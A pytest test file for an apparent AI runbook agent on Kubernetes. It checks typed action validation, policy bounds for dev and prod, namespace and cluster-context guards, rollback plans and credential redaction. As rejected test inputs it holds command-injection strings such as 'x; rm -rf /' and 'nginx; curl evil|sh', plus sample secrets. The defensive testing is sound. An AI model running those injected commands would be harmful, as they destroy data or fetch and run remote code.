import pytest
from pydantic import TypeAdapter, ValidationError

from runbook_copilot.agent.actions import Action, build_argv, plan_rollback
from runbook_copilot.agent.executor import Executor
from runbook_copilot.agent.health import redact
from runbook_copilot.agent.policy import Context, Decision, Policy
from runbook_copilot.agent.quantities import parse_cpu, parse_memory

ta = TypeAdapter(Action)
dev, prod = Policy.load("dev"), Policy.load("prod")


def act(**kw):
    base = {"namespace": "lab-x"}
    base.update(kw)
    return ta.validate_python(base)


DEP = {"metadata": {"name": "web"}, "spec": {"replicas": 2, "template": {"spec": {"containers": [{
    "name": "app", "image": "nginx:1.27", "ports": [{"containerPort": 80}],
    "resources": {"limits": {"memory": "100Mi"}, "requests": {"memory": "50Mi"}},
    "readinessProbe": {"httpGet": {"path": "/", "port": 8080}}}]}}}}
POD = {"metadata": {"name": "p", "ownerReferences": [{"kind": "ReplicaSet", "name": "web-1"}]}}


def ctx(**kw):
    return Context(target=kw.pop("target", DEP), pod_labels=kw.pop("pod_labels", [{"app": "web"}]), **kw)


# ------------------------------------------------------------------ quantities
def test_quantities():
    assert parse_memory("100Mi") == 100 * 2**20 and parse_memory("1Gi") == 2**30 and parse_memory("500M") == 500_000_000
    assert parse_cpu("250m") == 250 and parse_cpu("2") == 2000 and parse_cpu("0.5") == 500
    with pytest.raises(ValueError):
        parse_memory("lots")


# ------------------------------------------------------------------ typed actions: the model cannot smuggle commands
@pytest.mark.parametrize("bad", [
    {"type": "delete_pod", "name": "--all"}, {"type": "delete_pod", "name": "x; rm -rf /"},
    {"type": "set_image", "name": "a", "container": "c", "image": "nginx; curl evil|sh"},
    {"type": "scale_deployment", "name": "a", "replicas": 1, "extra": "--force"},
    {"type": "exec", "name": "a"}, {"type": "scale_deployment", "name": "a", "replicas": -1},
    {"type": "patch_probe", "name": "a", "container": "c", "probe": "readiness", "path": "/a b"},
    {"type": "patch_probe", "name": "a", "container": "c", "probe": "readiness", "port": 99999},
    {"type": "set_resources", "name": "a", "container": "c", "memory_limit": "lots"},
    {"type": "patch_service_selector", "name": "a", "selector": {}},
    {"type": "scale_deployment", "name": "A_B", "replicas": 1},
])
def test_invalid_actions_rejected(bad):
    with pytest.raises(ValidationError):
        act(**bad)
    with pytest.raises(ValidationError):  # and a hostile namespace
        ta.validate_python({**bad, "namespace": "-n kube-system"})


def test_argv_has_no_shell_and_no_extra_flags():
    a = act(type="set_resources", name="web", container="app", memory_limit="256Mi", cpu_request="100m")
    argv = build_argv(a)
    assert argv[:3] == ["patch", "deployment", "web"] and "--force" not in argv and "-o" not in argv
    assert build_argv(a, dry_run=True).count("--dry-run=server") == 1
    assert build_argv(act(type="delete_pod", name="p")) == ["delete", "pod", "p", "-n", "lab-x", "--wait=false"]
    assert build_argv(act(type="rollout_undo", name="web")) == ["rollout", "undo", "deployment/web", "-n", "lab-x"]


def test_rollback_plans_restore_previous_values_and_remove_absent_ones():
    a = act(type="set_resources", name="web", container="app", memory_limit="256Mi", cpu_request="100m")
    (rb,) = plan_rollback(a, DEP)
    body = rb[rb.index("-p") + 1]
    assert '"memory":"100Mi"' in body and '"cpu":null' in body  # cpu request did not exist: null removes it
    assert plan_rollback(act(type="scale_deployment", name="web", replicas=1), DEP) == [
        ["scale", "deployment/web", "--replicas=2", "-n", "lab-x"]]
    assert plan_rollback(act(type="delete_pod", name="p"), POD) == []
    sel = act(type="patch_service_selector", name="s", selector={"app": "web"})
    assert plan_rollback(sel, {"spec": {"selector": {"app": "wbe"}}})[0][-1].count("wbe") == 1


# ------------------------------------------------------------------ policy
def test_prod_is_advise_only_and_dev_allows():
    a = act(type="scale_deployment", name="web", replicas=3)
    assert dev.check_action(a, ctx()).outcome == "allow"
    assert prod.check_action(a.model_copy(update={"namespace": "prod"}), ctx()).outcome == "advise"
    assert not prod.check_action(a, ctx()).allowed


def test_executor_refuses_without_allow():
    class Boom:
        def run(self, *a, **k):
            raise AssertionError("must not execute")

    ex = Executor(Boom())
    a = act(type="rollout_restart", name="web")
    for outcome in ("advise", "deny", "needs_approval"):
        with pytest.raises(PermissionError):
            ex.apply(a, Decision(outcome))
        with pytest.raises(PermissionError):
            ex.dry_run(a, Decision(outcome))


def test_namespace_rules():
    ok = {"runbook-copilot/agent": "allowed"}
    assert dev.check_namespace("lab-a", ok).allowed
    assert not dev.check_namespace("lab-a", {}).allowed  # opt-in label missing
    for ns in ("kube-system", "default", "observability", "prod", "myprod"):
        assert not dev.check_namespace(ns, ok).allowed, ns
    assert not dev.check_namespace("random-ns", ok).allowed  # not in the allowed globs
    assert prod.check_namespace("prod", {}).outcome == "allow" and not prod.check_namespace("lab-a", {}).allowed


def test_kube_context_guard():
    assert dev.check_kube_context("kind-runbook-lab").allowed
    for c in ("prod-eks", "gke_prod", "uat-cluster", "stagingx", "some-random-cluster", ""):
        assert not dev.check_kube_context(c).allowed, c


@pytest.mark.parametrize("kw,ok", [
    ({"type": "scale_deployment", "name": "web", "replicas": 5}, True),
    ({"type": "scale_deployment", "name": "web", "replicas": 6}, False),
    ({"type": "scale_deployment", "name": "web", "replicas": 0}, False),
    ({"type": "set_resources", "name": "web", "container": "app", "memory_limit": "256Mi"}, True),
    ({"type": "set_resources", "name": "web", "container": "app", "memory_limit": "500Mi"}, False),  # >4x current
    ({"type": "set_resources", "name": "web", "container": "app", "memory_limit": "2Gi"}, False),  # over cap
    ({"type": "set_resources", "name": "web", "container": "app", "memory_limit": "8Mi"}, False),  # under floor
    ({"type": "set_resources", "name": "web", "container": "app", "memory_request": "200Mi"}, False),  # > limit
    ({"type": "set_resources", "name": "web", "container": "nope", "memory_limit": "200Mi"}, False),
    ({"type": "set_resources", "name": "web", "container": "app", "memory_request": "512Gi"}, False),  # absurd request
    ({"type": "set_resources", "name": "web", "container": "app", "cpu_request": "100m"}, True),
    ({"type": "set_resources", "name": "web", "container": "app", "cpu_request": "64"}, False),
    ({"type": "set_resources", "name": "web", "container": "app"}, False),
    ({"type": "set_image", "name": "web", "container": "app", "image": "nginx:1.26"}, True),
    ({"type": "set_image", "name": "web", "container": "app", "image": "evil/nginx:1.26"}, False),
    ({"type": "set_image", "name": "web", "container": "app", "image": "nginx:latest"}, False),
    ({"type": "set_image", "name": "web", "container": "app", "image": "nginx:1.27"}, False),
    ({"type": "patch_probe", "name": "web", "container": "app", "probe": "readiness", "port": 80}, True),
    ({"type": "patch_probe", "name": "web", "container": "app", "probe": "readiness", "port": 9999}, False),
    ({"type": "patch_probe", "name": "web", "container": "app", "probe": "liveness", "path": "/"}, False),  # no liveness probe
    ({"type": "rollout_undo", "name": "web"}, True),
    ({"type": "rollout_restart", "name": "web"}, True),
])
def test_dev_policy_bounds(kw, ok):
    assert dev.check_action(act(**kw), ctx()).allowed is ok


def test_selector_must_match_existing_pods_and_delete_needs_owner_and_budgets():
    sel = act(type="patch_service_selector", name="s", selector={"app": "web"})
    assert dev.check_action(sel, ctx(target={"spec": {}}, pod_labels=[{"app": "web"}])).allowed
    assert not dev.check_action(sel, ctx(target={"spec": {}}, pod_labels=[{"app": "other"}])).allowed
    d = act(type="delete_pod", name="p")
    assert dev.check_action(d, ctx(target=POD)).allowed
    assert not dev.check_action(d, ctx(target={"metadata": {"name": "bare"}})).allowed  # bare pod: would not come back
    assert not dev.check_action(d, ctx(target=POD, deletes_done=1)).allowed
    assert not dev.check_action(act(type="rollout_undo", name="web"), ctx(writes_done=3)).allowed  # write budget
    assert not prod.check_action(act(type="delete_pod", name="p", namespace="prod"), ctx(target=POD)).allowed


def test_approval_flag_and_protected_namespace_in_action():
    p = Policy({**dev.data, "actions": {**dev.actions, "rollout_undo": {"allow": True, "requires_approval": True}}})
    assert p.check_action(act(type="rollout_undo", name="web"), ctx()).outcome == "needs_approval"
    assert not dev.check_action(act(type="rollout_undo", name="web", namespace="kube-system"), ctx()).allowed


def test_unknown_action_type_denied_by_policy():
    p = Policy({**dev.data, "actions": {}})
    assert p.check_action(act(type="rollout_undo", name="web"), ctx()).outcome == "deny"


# ------------------------------------------------------------------ redaction
@pytest.mark.parametrize("raw,leak", [
    ("DB_PASSWORD=hunter2", "hunter2"), ("Authorization: Bearer eyJhbGciOi.payload.sig", "eyJhbGciOi"),
    ("api_key: sk-abc123", "sk-abc123"), ("aws.secret.access.key = AKIA999", "AKIA999"),
    ('password: "two words"', "two words"),
])
def test_redaction_removes_credentials(raw, leak):
    assert leak not in redact(raw)


def test_redaction_leaves_normal_text():
    assert redact("keyboard=ok monkey=ok pod web-1 Ready") == "keyboard=ok monkey=ok pod web-1 Ready"


def test_hostile_namespace_rejected_even_with_a_valid_action():
    for ns in ("-n kube-system", "lab-x;rm", "LAB", ""):
        with pytest.raises(ValidationError):
            ta.validate_python({"type": "rollout_undo", "name": "web", "namespace": ns})
